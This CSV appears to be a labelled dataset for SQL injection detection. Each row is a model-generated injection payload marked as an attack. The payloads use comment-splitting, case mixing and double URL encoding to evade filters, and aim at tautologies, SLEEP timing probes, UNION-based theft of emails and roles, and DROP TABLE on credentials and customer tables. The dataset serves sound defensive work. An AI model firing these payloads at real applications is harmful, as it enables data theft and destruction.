text,label,attack_type,generator
""");%0AdRoP%0aTaBlE%0aCuStOmErS/*x*/",1,sqli,codellama
%2527%253B%2520SeLeCt%2520sLeEp%25285%2529%252523,1,sqli,codellama
"""+A/**/N/**/D+0<1+--%0a",1,sqli,codellama
%2522%2529%2520OR%25201%253D1%2520LIMIT%25201--%2520,1,sqli,codellama
%2522%2529%2520Or%2520%2527%2527%253d%2527%2527%2520--%2520-,1,sqli,codellama
')/**/aNd/**/1 BeTwEeN 0 AnD 9/**/%23,1,sqli,codellama
%2522%252509AND%252509%2527%2527%253D%2527%2527%252509%2523,1,sqli,codellama
%2560%252F%252A%252A%252FA/**/N/**/D%252F%252A%252A%252F1%253D2%252F%252A%252A%252F%252523,1,sqli,codellama
""")+A/**/N/**/D+'a'='a'+#",1,sqli,codellama
""")	O/**/R	'a'='a'	-- ",1,sqli,codellama
']%09A/**/N/**/D%09'a'='a'%09/*x*/,1,sqli,codellama
%2560%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520NULL%252CNULL%252CNULL%252F%252Ax%252A%252F,1,sqli,codellama
%2527%25250d%25250aAND%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--,1,sqli,codellama
%2522%25250aAND%25250a2%253E1%25250a%252523,1,sqli,codellama
`; D/**/R/**/O/**/P TABLE admin/*x*/,1,sqli,codellama
%2522%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529--%2520-,1,sqli,codellama
%2527%2520UNION%2520SELECT%2520email%252Crole%2520FROM%2520customers%2523,1,sqli,codellama
`/**/AnD/**/2>1/**//*X*/,1,sqli,codellama
';+DROP+TABLE+staff/*x*/,1,sqli,codellama
%2522%2509A%252F%252A%252A%252FN%252F%252A%252A%252FD%25091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%2509--%2520-,1,sqli,codellama
']%09AnD%09'a'='a'%09--,1,sqli,codellama
') O/**/R 1=1 LIMIT 1%23,1,sqli,codellama
']%0d%0Aa/**/N/**/d%0D%0a''=''%0d%0A--,1,sqli,codellama
'%0aA/**/N/**/D%0a0<1%0a--,1,sqli,codellama
%2527%2529%2520A/**/N/**/D%2520extractvalue%25281%252Cconcat%25280x7e%252C%2528S/**/E/**/L/**/E/**/C/**/T%2520status%2520F/**/R/**/O/**/M%2520admin%2520LIMIT%25201%2529%2529%2529,1,sqli,codellama
%2522%25250D%25250aAnD%25250d%25250A1%2520bEtWeEn%25200%2520aNd%25209%25250D%25250a--,1,sqli,codellama
%2522%25250aUNION%25250aSELECT%25250alast_name%252Cusername%252Crole%252Cstatus%25250aFROM%25250asessions%252F%252Ax%252A%252F,1,sqli,codellama
` a/**/N/**/d ''='' #,1,sqli,codellama
%2560%252BoR%252b1%2520BeTwEeN%25200%2520AnD%25209%252b%252523,1,sqli,codellama
`+oR+1=2+--%09-,1,sqli,codellama
%2522%2529%2509AND%25092%253E1%2509--%252F%252A%252A%252F-,1,sqli,codellama
`; DrOp tAbLe cReDeNtIaLs#,1,sqli,codellama
